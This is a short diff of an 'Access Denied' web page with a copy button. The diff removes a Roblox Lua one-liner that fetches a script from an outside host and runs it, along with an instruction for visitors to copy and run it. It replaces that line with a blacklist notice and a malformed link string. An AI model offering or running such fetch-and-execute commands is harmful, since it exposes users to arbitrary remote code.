@@ -21,7 +21,7 @@
 <body>
     <div class="container">
         <h1><span>🚫</span> Access Denied</h1>
-        <p>Copy the code below to run it.</p>
+        <p>you have been blacklisted from this site.</p>
         <div class="code-container">
             <pre><code id="copy-text-content">Loading...</code></pre>
             <button id="copy-button">Copy</button>
@@ -31,7 +31,7 @@
         document.addEventListener('DOMContentLoaded', function() {
             const codeElement = document.getElementById('copy-text-content');
             const copyButton = document.getElementById('copy-button');
-            const command = `loadstring(game:HttpGet("https://princehomemade.my.id/myscript"))()`;
+            const command = `https://linktr.ee/princexecutor"))()`;
             codeElement.textContent = command;
             copyButton.addEventListener('click', () => {
                 navigator.clipboard.writeText(command).then(() => {
